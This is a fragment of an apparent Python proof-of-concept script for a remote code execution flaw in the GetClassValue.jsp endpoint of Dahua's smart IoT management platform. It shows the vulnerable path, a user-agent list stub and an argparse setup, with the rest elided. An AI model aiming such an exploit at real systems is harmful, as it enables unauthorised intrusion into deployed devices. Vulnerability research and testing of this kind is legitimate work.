...
def poc(target):
    payload="/evo-apigw/admin/API/Developer/GetClassValue.jsp"
    user_agents = [
...
def banner():
    pass
def main():
    parse=argparse.ArgumentParser(description="大华智能物联综合管理平台GetClassValue.jsp远程代码执行漏洞")
